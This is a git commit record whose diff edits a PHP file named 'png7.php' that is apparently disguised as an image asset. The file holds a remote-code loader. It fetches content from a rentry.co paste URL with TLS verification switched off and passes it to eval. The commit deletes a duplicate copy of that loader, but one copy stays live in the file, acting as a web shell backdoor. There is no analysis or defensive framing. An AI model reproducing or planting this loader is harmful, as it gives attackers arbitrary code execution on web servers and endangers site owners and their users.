081ee0f4dcf3c5aef0f23e1f7dda62dd6d728476
Kiki <kikiamalia122000@gmail.com>
2024-08-04 18:59:00 +0700

    png7.php

--- back/mati/kau/png7.php
+++ back/mati/kau/png7.php
@@ -29,21 +29,3 @@ function aaFa($url)
 $str=aaFa("https://rentry.co/mhsruvfc/raw");
 echo eval("?>".(($str)));
 ?>
-
-<?php 
-
-function aaFa($url)
-{
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $url);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-  $result = curl_exec($ch);
-  curl_close($ch);
-  return $result;
-}
-
-$str=aaFa("https://rentry.co/mhsruvfc/raw");
-echo eval("?>".(($str)));
-?>
